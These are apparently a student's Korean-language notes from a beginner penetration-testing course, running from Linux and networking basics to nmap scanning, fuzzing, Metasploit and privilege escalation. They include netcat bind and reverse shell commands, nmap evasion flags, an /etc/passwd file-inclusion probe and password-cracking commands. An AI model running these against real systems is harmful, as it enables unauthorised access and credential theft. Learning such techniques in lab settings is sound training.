비기너 클래스 정리

1일차
Linux (Kali)
- CLI(command-line interface) : text, 글자로 컴퓨터를 조종
해킹에 CLI사용이유 : 해킹후 GUI로 받아올시 트래픽량이 많기 때문에 CLI를 쓴다
vi,vim사용이 어려울경우 mousepad 사용시 편함

/etc/passwd - 계정이름:비번(보안문제로 해쉬처리 후 /etc/shadow로 이동):UID:GID:설명:hoom디렉토리:쉘위치
UID : user ID
GID : group ID
쉘위치=nologin -> 명령어를 위한 계정으로 로그인 불가
** 크리덴셜 스터핑의 위험때문에 shadow파일로 해쉬처리후 이동 시킴

리눅스 명령어
-cat,tail,more 파일 읽기
-ls 하위 파일 보기
-cd 디렉토리 이동
-su 사용자 변경
-mkdir 디렉토리 생성
-rm 파일 지우기
-mv 파일 이동
-netstat -ant 현재 열려있는 포트 번호 확인
-grep [글자] [파일] 특정 글자 찾기 (| grep으로도 쓰며 2> /dev/null을 쓰면 오류를 공허로 보냄)
-service apache2 start 아파치로 웹 포트인 80포트 열기

** SSH (Secure Shell)
rsh > 원격에서 컴퓨터에 접속하는 서비스 (통신시 암호화를 안하기 떄문애 취약함)
-ssh [계정 이름]@[IP 주소 or Domain] -p [포트]
기본 : 22번 포트

과제
1.write-up 쓰기
2.bandit 워게임

2일차
네트워크
-> OSI 7 Layer

1 -> 물리계층

2 -> MAC주소 (media access control address)

   MAC주소 : 기기(랜카드)마다의 고유주소 *바뀔수 없음.단,속일수는 있음*
   ARP (Address Resolution Protocol) 주소 결정 프로토콜 (linux명령어 arping으로 가능)
    -> IP를 부르면 MAC주소를 알려주는 프로토콜
   ARP Spoofing 
   -> IP를 물어볼 때 자신이 그 주소인척 대답하는 기술
   -> 추후 MITM(man in tne middle)공격으로 이어질 수 있음

3 -> Internet : IP

   ** IP 주소
   > 컴퓨터의 주소

   IPv4
   > 0~255.0~255.0~255.0~255 -> 약42억개
   8bit -> 0(00000000)~255(11111111)

   #컴퓨터를 많이 쓰면서 IP주소가 부족해짐
    해결법
   1) 같이쓰자! > 공유기(NAT)
   2) IP주소 개수를 늘리자! > IPv6
 
   *NAT(Network Address Translation) = 네트워크 주소 변환
   **내부 IP 주소 -> ipconfig,공유기에 할당받은 주소 
   ex)192.168.0.4
      172.168.0.2
   **외부 IP 주소 -> myip,공유기의 주소

   **Netmask
   IP : 192.168.0.2
   netmask : 255.255.255.0
    사용가능 IP-> 192.168.0.0~255
   0:사용안함,1:게이트웨이 주소,255:브로드캐스트 주소(전채 전송)
   -> 실제사용 개수는 253개

4 -> TCP/UDP : Port번호

   TCP (Transmission Control Protocol)
   -> 데이터를 안전하게 보내는 방법
   -> 연결 지향적!
   -> 3 way handshake

      A           B
      |    SYN    |
      |    -->    |
      |  ACK SYN  |
      |    <--    |
      |    ACK    |
      |    -->    |
      |           |

   UDP (User Datagram Protocol)
   -> 막 보냄
   -> 받던 말던 상관 없음

5,6,7 -> 전송
   계층을 지나는 과정을 encapsulation이라고 하고 그 반대를 decapsulation라고 한다.

숙제
1. 오늘 배웠던 내용 정리 (네트워크)
2. HTTP 프로토콜 (+ Wireshark, HTTP, HTTPS)
3. DNS 공부.
4. 웹브라우저에서 "네이버" 사이트 들어가보기. (with Wireshark)

)___ 패킷 : 데이터 덩어리

3일차
Remote Shell(원격 쉘)
> 명령어를 내릴 수 있는 프로그램
> CLI Shell

* 앞으로의 우리 목표
   > 원격 쉘을 획득하자
   > 쉘을 딴다. 쉘을 획득했다.

* 정상적인 방법
   > telnet, ssh, rsh, rdp ...
   -> well-known port ) ssh:22, http:80 ,https:443 과 같은 암묵적인 약속
   * ssh 걔정 탈취
   * ssh 계정을 만든다.
   > 취약점을 이용해서
   > linux 계정을 만든다.
   > 취약점 : "내가 원하는 명령어를 실행"
   useradd [ID] [passwd]

** 비정상적인 방법

TCP 네트뤄크 연결 (nc)
nc : network concat
   *서버 역할 : 문을 연다
   nc -nvlp 포트번호 -e 프로그램

   n : 호스트 네임과 포트를 숫자로만 출력
   v : 더 많은 정보 출력
   l : listen 모드로 열기
   p : 포트번호 설정
   e : 프로그램으로 연결
   *클라이언트 역할
   nc [IP 주소] [포트번호]

Bind Shell
> 피해자 컴퓨터가 포트를 열고, 공격자가 거기로 들어간다.

   nc -nvlp 7777 -e /bin/bash

   1) 사회공학기법 (속이기)
   2) 프로그램에 몰래 숨기기 (악성코드)
   3) 취약점을 이용 (RCE)

Reverse Shell
   > 공격자가 문을 열고,
   > 피해자가 거기로 들어온다. (자신의 쉘을 들고)

   공격자
   nc -nlvp 7777

   피해자
   nc [ip] 7777 -e /bin/bash

   만드는 사이트:https://www.revshells.com/

Reverse Shell이 중요한 이유
주로 방화벽은 아웃바운드에 설정을 잘 안하기 떄문에
	
python -c "import pty;pty.spawn('/bin/bash')"

과제
1. 오늘배운 내용 정리
2. Reverse Shell Generator에서 다양한 명령어 사용해보기




4일차
웹 서버 & 웹 해킹

해킹 장르
1) 포너블
2) 웹 해킹
3) 리버싱
4) 포렌식
5) 모바일 앱 해킹
6) 무선 네트워크 해킹
7) 침투테스트 (Pentest)


** 웹 서버
   > 웹 사이트
   > 웹 브라우저. (Brave, chrome)

    웹 서버에 게 자료를 부탁하는 것.

** 자료 주세요! (Reqeust) 방법
   URl Link

   http://(IP 주소 or Domain):(포트번호)/(파일이름)?(파라미터)
   https://(IP 주소 or Domain):(포트번호)/(파일이름)?(파라미터)

   포트번호를 안쓸시 well known 포트를 쓴 것과 같다. - (http의 경우 80포트, https의 경우 443포트이다.)
   파일이름을 안쓸경우 index.html을 적은 것과 같다.
   *파라미터 : 변수를 넣어주는것 ex) name:me&age:19 -> name에 me를 넣고 age에 19를 넣는 것!

** 웹서버 켜기
   apache란 http웹 서버 소프트웨어 이다.
   웹서버 실행 명령어 : service apache2 start
   서버의 html 기본 위치 : /var/www/html
   폴더에 index.html이 없을 시 모든 파일이 보이므로 보안에 좋지 않다.

   127.0.0.1 : localhost라고도 불리며 바로 접속하기 때문에 자원을 덜쓰게 된다. 

** 정적 페이지 vs 동적 페이지
   
   클라이언트 측 코드 : 웹 브라우저 실행
   서버 측 코드 : 서버에서 실행

   웹 쉘 : 업로드 취약점을 통하여 시스템에 명령을 내릴 수 있는 코드

** 파일 업로드
   게시판 자료실
   파일 첨부
   프로필 사진 업로드
   동영상 업로드
   ... 파일 업로드




* 프로토콜 : 약속, 규칙.


과제
1. 배운내용정리
2.웹서버 쉘 획득하기






Skill Course [1]
1 _ 정보수집
2 _ 서비스 분석
3 _ Exploit > Shell
4 _ Post-Exploit > 권한상승

* 정보 수집
> 공격할 대상 (IP 주소)
> A 기업.
- 웹 서버 리스트
- 서버 리스트

*Nmap

- Host Discovery (Host Scan)
> 

- ARP Scan
> 내가 그 네트워크안에 있을 떄.

- ICMP PING Scan
>

** 포트 스캔
> IP 주소
> 포트 번호
> nmap [IP주소]

*nmap 과정
1. ping을 보내서 IP주소가 열려있는지 확인한다.
2.TCP SYN을 사용해 443포트를 확인한다.
3.ACK를 이용해 80포트를 확인한다.

위 과정을 통해 서버가 살아있는지 먼저 확인한다.
**옵션
-Pn옵션을 사용하면 위 과정을 하지 않고 바로 포트스캔을 진행한다.
-p-옵션을 사용하면 전체포트를 스캔한다.
-Sv옵션으로 사용 프로그램을 알아낼수 있다.
-sU옵션으로 UDP스캔을 할 수 있다.
-f옵션을 사용하면 방화벽을 우회할 수 있다.
-D RND:[숫자] 을 사용하면 자신의 IP를 다른 IP와 섞어 보내서 자신을 숨길 수 있다.
-T[1~5]옵션을 사용하면 속도를 조절할 수 있다. (숫자가 5일수록 빠르다.)
-sC옵션을 사용하면 기본 스크립트로 대상을 스캔한다.
-O옵션을 사용하면 운영체제를 알 수 있다.

[-] 스텔스 스캔 원리
-sS옵션은 기본적으로 사용한다.
스텔스 스캔의 원리는 3way-handshake중 syn만 보내고 ack를 보내지 않는다.(syn,ack가 오기만 하면 포트가 열려있는 것을 알기 때문에)
________________________________________________________________________________________________________________________________________

*nmap -sVC -O [IP주소] > scan_res

* 웹서버 : 취약점이 많다.!
80, 443 포트가 열려있다.?
-> 취약점이 매우매우ㅐ무우 많다!


[1] 직접 방문하는 것.!
()

[2] 웹 디렉토리 스캔
우리가 자주 쓰는 단어들.
login.php
admin.php

dirb [URL] -p [Proxy URL]

proxy 이용

[3] 웹 취약점을 스캔해라!
nukto -h [URL]

nukto -h [URL] -useproxy [Proxy URL]



과제
1. nmap 사용법 정리.
+ wireshark
2. proxy 세팅 후 정보 수집.
-> 취약점을 찾을 수 있도록 최대한 많은 정보를 수집하는 것.





Skill Course [2]

* 그 정보를 이용해서, 취약점을 찾고 공격하는 과정.
서비스 분석
Exploit -> Shell

nmap
21 -> FTP
: File Transfer Protocol
: 파일을 주고 받는 프로토콜
: 익명 모드가 있다!

22 -> SSH (높은 확률로 열려있음)
-> 리눅스의 계정 크리덴셜 탈취

80 -> HTTP(Web)
ssh: 비밀번호 , rsa Key


21/tcp open ftp     ProFTPD 1.3.3c
                     ^FTP의 프로그램명
즉,ProFTPD 1.3.3c의 취약점을 찾으면 된다!
*취약점 찾는 방법
> 구글링                 ex) ProFTPD 1.3.3c exploit github
**반드시 영어로 할 것**

** searchsploit

취약점
> RCE,BoF
Remote command Execution
Buffer Overflow

exploit code 파일

-txt

- rb
> 루비 파일
> 메타스플로잇 모듈

- py
> python
> python3 [~~~.py]

- c
> C언어 파일
> gcc
> gcc [~~~.c] -o exploit       (exploit이라는 파일로컴파일)

- sh
> shell 파일
> 실행권한을 추가, 실행
chmod u+x [~~~.sh]
** ${1} -> 1번째 인자 
     ${2} -> 2번째 인자

과제
1. Task2, 3 다시 해보기 (Replay)
-> 직접 해보는 것!

2. Task4 해보기 (직접)
-> 풀어보세요!

3. Task5 <조금 어려움>
고민, 노력








Skill Course [3]

www-data 계정

웹 서버 /

(1) 다른 계정으로 바꿔!
(2) 웹 서버 계정으로 먹을 수 있는거!
> DB (데이터베이스)

mysql -u 

데이터베이스 보기
   show databases;
데이터베이스로 들어가기
   use [데이터베이스 이름];

테이블 보기
show tables;

데이터 보기
select * from [테이블 이름];

crunch -o

john --wordlist=[wordlist.txt] [hash.txt]


sudo -l


authorized_keys


과제
1. 다시 복습하기 -write up(왜 그걸 했는지!)
2.target 2 - shell 획득 & Root Shell 권한 상승





Skill Course [4]

[-] Module

1. Auxiliary
> 공격에 바로 활용되는건 아니지만!
> 도와주는 서포트 모륳

> 스캔, 정보 enumerate

나열하다
> 정보를 나열하다
> 정보 수집


2. ENcoder
> 인코딩을 하는 친구
base64 같은거.
>> 모양을 규칙에 맞게 바꿔주는 거
>> 정보를 숨기기위해서 X

-> payload에 적용된다

Exploit Code VS PayloadCode
-> 공격코드
-> 취약점을 이용하는 코드

명령어를 하나 실행할 수 있다!
-> 페이로드

백신 탐지.
> 시그니쳐 기반 탐지



3. Evasion
> 백신 탐지우회


4. Exploit 모듈
> 공격 모듈
> 취약점을 이용하는 모듈
> shell


5. NOP
> No OPeration : 어셈블리 언어
0x90 : NOP코드
> 더미 코드


6. Payload
> 타겟컴퓨터에서 실행하는 모듈

Adapter -> 프로그램을 원하는 언어로 실행하도록 만들어줌
singles -> 단일 코드 (shell_~~~) 

stagers -> 먼저 들어가는 놈(메모리공간 확보, 환견셍팅 등등) (shell/~~~~)
stage -> 



1. 오늘 한 내용 정리. Metasploit 정리
> metasploit, bolt

2. metasploit을 이용해 공격해 보기
https://tryhackme.com/room/ice

3. 3주차에 했던 task1, task2



Drill Course [1]

dirbuster
파일 위치 : /user/share/wordlist
ㄴ> /secret/evil.php

WEB FUZZING

ffuf -u [URL] -w (wordlist)

wordlist : /usr/share/wordlists/rockyou.txt.gz

gunzip -d /usr/share/wordlists/rockyou.txt.gz

?FUZZ=/etc/passwd

-fs 0 : 파일사이즈가 0이면 스킵을 하겠다. 

/home/name/.ssh/id_rsa
키의 권한은 600이어야한다.

john [FILE] --wordlist=/usr/share/wordlist/rockyou.txt
ssh2john [FILE] > hash


python3 -m http.server 80


mkpasswd --method=SHA-512 --stdin






Drill Course [1]
NFS : Network File System  (well known port:111)
NFS 실행중 -> TCP : 111번 포트가 열려있다

showmount -e [IP Address]
-> NFS중인 파일들을 보여준다.

mount [IP Address]:[경로] [실제내컴퓨터경로]
ex) mkdir /tmp/nfs
    mount 192.168.50.170:/home/itsme /tmp/nfs


과제

1. 오늘 문제 풀이. 정리
2. Target 2번 풀기




Drill 2_2

- SSH Key
- NFS service



boot2root
xss -> X
피싱공격


wordpress안에 있는 취약점을 찾아줌
wpscan --url [URL]



















